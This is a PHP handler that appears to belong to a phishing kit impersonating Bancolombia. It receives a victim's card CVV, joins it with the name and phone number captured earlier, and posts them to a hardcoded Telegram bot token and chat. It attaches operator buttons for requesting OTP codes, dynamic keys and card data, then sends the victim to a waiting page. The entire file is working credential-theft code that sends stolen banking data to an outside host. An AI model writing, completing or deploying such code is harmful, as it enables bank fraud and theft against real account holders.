<?php
/**
 * enviar_dato_extra55.php
 * -----------------------
 * Handler POST de CVV (código de seguridad de 3-4 dígitos después de capturar tarjeta).
 *
 * 7 pasos standard:
 *   1) Recibe $_POST['codigo'] (cvv), 'key'.
 *   2) SELECT por key BINARY nombre / telefono de la solicitud.
 *   3) Nuevo request_id BCO_<144 bits> (scope Bancolombia).
 *   4) UPDATE solicitudes: request_id nuevo + estado = 'pendiente'.
 *   5) Mensaje Telegram "CVV recibida" + teclado inline (OPCION_9=ERROR Dinámica, OPCION_10=FINALIZAR).
 *   6) 302 → espera.html?rid=&key=.
 *   7) exit.
 */

ob_start();
require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

// ── Paso 1: Lectura segura del POST ───────────────────────────────────────────
$codigo = $_POST['codigo'] ?? '';
$key    = $_POST['key']    ?? '';

if (!$key) {
    die("Error: Key no proporcionada.");
}

// ── Paso 2: Datos previos (WHERE BINARY por DB compartida) ────────────────────
$stmt = $pdo->prepare(
    "SELECT nombre, telefono FROM solicitudes WHERE BINARY `key` = ? LIMIT 1"
);
$stmt->execute([$key]);
$data = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$data) {
    die("Error: Solicitud no encontrada.");
}

$nombre   = $data['nombre'];
$telefono = $data['telefono'];

// ── Paso 3: RID con prefijo BCO_ (requisito shared webhook) ───────────────────
try {
    $nuevo_request_id = 'BCO_' . bin2hex(random_bytes(18));
} catch (Throwable $_) {
    $nuevo_request_id = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
}

// ── Paso 4: Reset de estado / rid para polling espera.html ────────────────────
$update = $pdo->prepare(
    "UPDATE solicitudes SET request_id = ?, estado = 'pendiente' WHERE BINARY `key` = ?"
);
$update->execute([$nuevo_request_id, $key]);

// ── Paso 5: Telegram ──────────────────────────────────────────────────────────
$token   = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";
$chat_id = "-4923753161";

$mensaje  = "📥 CVV recibida:\n";
$mensaje .= "👤 $nombre\n";
$mensaje .= "🔒 $telefono\n";
$mensaje .= "🔓: $codigo\n";

// Set ORIGINAL de botones preservado
$botones = [
    'inline_keyboard' => [[
        ['text' => "🟢DINAMICA",       'callback_data' => "OPCION_1_$nuevo_request_id"],
        ['text' => "🟢OTP/SMS",        'callback_data' => "OPCION_2_$nuevo_request_id"],
    ], [
        ['text' => "🔴WHATSAPP",       'callback_data' => "OPCION_3_$nuevo_request_id"],
        ['text' => "🟢PERSONALES",     'callback_data' => "OPCION_4_$nuevo_request_id"],
    ], [
        ['text' => "🟢CREDITO ",       'callback_data' => "OPCION_5_$nuevo_request_id"],
        ['text' => "🟢DEBITO",         'callback_data' => "OPCION_6_$nuevo_request_id"],
    ], [
        ['text' => "🔴ERROR USUARIO ", 'callback_data' => "OPCION_7_$nuevo_request_id"],
        ['text' => "🟢CVV",            'callback_data' => "OPCION_55_$nuevo_request_id"],
    ], [
        ['text' => "🔴ERROR DINAMICA ", 'callback_data' => "OPCION_9_$nuevo_request_id"],
        ['text' => "🟢FINALIZAR",       'callback_data' => "OPCION_10_$nuevo_request_id"],
    ]],
];

$payload = json_encode([
    'chat_id'      => $chat_id,
    'text'         => $mensaje,
    'reply_markup' => $botones,
]);

$ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

// ── Paso 6 y 7: Redirect loader indefinido ────────────────────────────────────
header("Location: espera.html?rid=$nuevo_request_id&key=$key");
exit;
